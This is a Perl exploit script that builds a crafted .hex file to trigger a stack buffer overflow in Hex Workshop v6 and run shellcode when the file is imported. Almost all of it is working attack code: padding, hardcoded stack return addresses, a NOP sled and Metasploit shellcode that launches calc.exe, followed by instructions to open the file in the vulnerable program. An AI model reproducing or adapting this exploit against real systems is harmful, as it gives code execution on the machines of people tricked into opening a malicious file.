#!/usr/bin/perl -w
# Hex Workshop <= v6 (.hex) File Local Code Execution
# Discovred by : Security^Ghost
# Exploited by : DATA_SNIPER
# Exploit Tested on WindoZ XP SP2 FR.
# for more information vist my blog:http://datasniper.arab4services.net/
# the exploit it's so weird ;),take look at the shellcode,and remember it's not AlphaNum.

print "==========================================================================\n";
print "Hex Workshop v6 (.HEX File) Local Code Execution\n";
print "Exploited by DATA_SNIPER\n";
print "Greetz to: arab4services team and AT4RE Team\n";
print "for more: http://datasniper.arab4services.net/\n";
print "===================================================================== \n";
$junk=":0000FC\x0D\x0A:";
$shelladd="B8EE1300D0EE1300C8EE1300AAAAAAAAC8EE1300C8EE1300";#shell address in the stack and some address junk for make the exploit work as well.
#some times the stack address change to "0012xxxx" so you can use this instead
# $shelladdrr="B8EE1200D0EE1200C8EE1200AAAAAAAAC8EE1200C8EE1200"
$nop="909090909090909090909090909090";# strange noop xD
#shellcode from metasploit,execute calc.exe
#shellcode copied as it's and when the data being treated will be converted to HEX format.
$shellcode="33c9b11ebbf01a028cdaccd97424f45a83c204315a0b035afbf8f77013b8f788e3cabdb468b038bd6fa6c87277b390ac86286726bc2579d68df9e38a693967d4b07085dbf06e62e0a0548f62ad1ed0a82cca893b2247dd6326560a104ad3cdccfbbfe9163860c3e0dec9478658c60cd868ad63c5dd3aebfd94c56f3dcc6518c0c864ab547096c6abd79830d0b60adc17";
$buff='A' x 248;
$sploit =$junk.$buff.$shelladd.$nop.$shellcode;
$fle = "Xploit.hex" ;
open($data, ">>$fle") or die "Cannot open $data";
print $data $sploit;
close($data);
print "$fle has been created\n";
print "open it in HexWorkshop file->import.\n";

